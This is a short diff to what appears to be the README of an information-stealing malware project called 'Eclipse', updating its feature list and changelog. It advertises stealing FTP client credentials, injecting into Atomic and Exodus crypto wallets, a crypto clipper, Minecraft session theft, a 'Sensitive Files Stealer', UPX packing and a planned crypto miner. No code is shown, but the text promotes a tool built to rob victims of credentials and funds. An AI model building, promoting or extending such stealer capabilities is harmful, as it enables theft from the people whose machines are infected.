@@ -58,6 +58,7 @@
 ⚙️ FTP Clients
 - Filezilla
 - WinSCP
+- Total Commander
 - ⏳ Working on (Putty, Telnet)
 
 ✉️ Emails
@@ -77,8 +78,7 @@
 💰 Wallet
 - Wallet Injection (Atomic, Exodus)
 - Wallet Desktop
-- Crypto Clipper
-- ⏳ Working on (Crypto Miner)
+- ⏳ Working on (Crypto Miner, Crypto Clipper)
 
 💻 Computer
 - UPX Packer
@@ -123,6 +123,7 @@
 - V1.2.8 Added Gecko Password Decryption (Not Working) and WinSCP (Updated), Removed Growtopia, Updated Games, Filezilla and Telegram Embed
 - V1.2.9 Added Minecraft Session Stealer & Crypto Clipper
 - V1.3.0 Changed Stealer Name to Eclipse
+- V1.3.1 reAdded Stealer & Added Shadow Games Client, Total Commander (FTP), Sensitive Files Stealer. Updated Tox, Signal, Clipper !!
 ```
 
 👤 Author
